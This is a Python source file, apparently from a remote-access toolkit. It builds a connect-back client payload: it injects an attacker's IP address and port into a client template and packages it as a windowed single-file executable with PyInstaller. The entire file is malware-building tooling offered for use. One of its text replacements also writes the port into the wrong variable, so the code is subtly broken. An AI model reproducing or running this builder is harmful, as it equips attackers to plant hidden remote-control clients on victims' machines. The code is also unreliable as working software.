import os
import platform
import shutil
import sys
import threading
import time
import PyInstaller.__main__

from common.output import output


class GENERATOR:

    def __init__(self, parser):
        self.output = self.append_payload_extension(parser.output, parser.source)
        self.base_directory = os.path.dirname(__file__)
        self.temp_dir = ""
        self.script_code = self.create_script(parser.address, parser.port)

        if parser.source:
            self.generate_script()
        else:
            self.generate_executable()
            self.clean()

    def append_payload_extension(self, out, source):
        filename = ""
        if source:
            if not out.endswith(".py"):
                filename = (out + ".py")
            else:
                filename = out
        else:
            if platform.system() == "Windows":
                if not out.endswith(".exe"):
                    filename = (out + ".exe")
                else:
                    filename = out
            elif platform.system() == "Linux":
                filename = (out)
            else:
                output.print_red("Unrecognized Platform")
        return filename

    def create_script(self, ip, port):
        output.print_blue("Compiling modules ... ")
        fl = open(os.path.join(self.base_directory, 'raw_client.py'))
        code = fl.read()
        fl.close()
        code = code.replace('CONSTIP = ""', f'CONSTIP = "{ip}"')
        code = code.replace('CONSTPT = None', f'CONSTIP = {port}')
        output.print_green("Script plain text generated successfully!")
        return code

    def generate_temp_dir(self):
        temporary_directory = os.path.join(self.base_directory, 'tmp')

        if not os.path.isdir(temporary_directory):
            os.mkdir(temporary_directory)

        fname = os.path.join(temporary_directory, 'temp.py')

        return temporary_directory, fname, 'temp.py'

    def generate_script(self):
        fl = open(self.output, 'w')
        fl.write(self.script_code)
        fl.close()

    def generate_executable(self):
        self.temp_dir = self.generate_temp_dir()
        fl = open(self.temp_dir[1], 'w')
        fl.write(self.script_code)
        fl.close()
        counter = 1

        t = threading.Thread(target=PyInstaller.__main__.run, args=([
                                                                        '--name=%s' % os.path.basename(self.output),
                                                                        '--onefile',
                                                                        '--windowed',
                                                                        '--log-level=ERROR',
                                                                        '--distpath=%s' % os.path.dirname(self.output),
                                                                        '--workpath=%s' % self.temp_dir[0],
                                                                        os.path.join(self.temp_dir[0], self.temp_dir[2])
                                                                    ],), )
        t.daemon = True
        t.start()

        while t.is_alive():
            sys.stdout.write(
                "\r" + output.BLUE + "[" + output.UNDERLINE + ":" + output.END + output.BLUE + "] " + output.END + "Elapsed Time: %is" % (
                    counter) + output.END)
            time.sleep(1)
            counter += 1

        sys.stdout.write("\n")

    def clean(self):
        output.print_blue("Cleaning files and temporary codes")
        shutil.rmtree(self.temp_dir[0])
        output.print_green("File: " + self.output)
